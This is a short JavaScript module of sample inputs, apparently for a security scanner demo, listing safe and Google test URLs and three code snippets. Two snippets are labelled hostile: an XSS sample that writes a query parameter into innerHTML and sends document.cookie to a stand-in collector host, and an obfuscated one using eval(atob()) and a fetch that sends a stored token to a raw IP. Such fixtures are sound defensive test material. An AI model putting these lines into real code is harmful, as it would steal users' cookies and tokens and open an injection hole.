export const SAMPLE_URLS = [
  { label: "Safe: google.com", url: "https://www.google.com" },
  { label: "Safe: github.com", url: "https://github.com" },
  {
    label: "Test: malware (Google test)",
    url: "http://malware.testing.google.test/testing/malware/",
  },
  {
    label: "Test: phishing (Google test)",
    url: "http://phishing.testing.google.test/testing/phishing/",
  },
];

export const SAMPLE_CODES = [
  {
    label: "Clean sample",
    filename: "hello.js",
    code: `function greet(name) {\n  return "Hello, " + name + "!";\n}\nconsole.log(greet("world"));\n`,
  },
  {
    label: "XSS sample",
    filename: "comment.html",
    code: `<div id="c"></div>\n<script>\nconst q = new URLSearchParams(location.search).get("q");\ndocument.getElementById("c").innerHTML = q;\nfetch("https://evil-collector.tk/log?c=" + document.cookie);\n</script>\n`,
  },
  {
    label: "Obfuscated sample",
    filename: "payload.js",
    code: `var _0x = "ZXZhbChhdG9iKCJhbGVydCgxKSIpKQ==";\neval(atob(_0x));\nvar s = String.fromCharCode(104,116,116,112);\nnew Function("x", "fetch('http://185.22.33.44/' + localStorage.getItem('token'))")(1);\n`,
  },
];
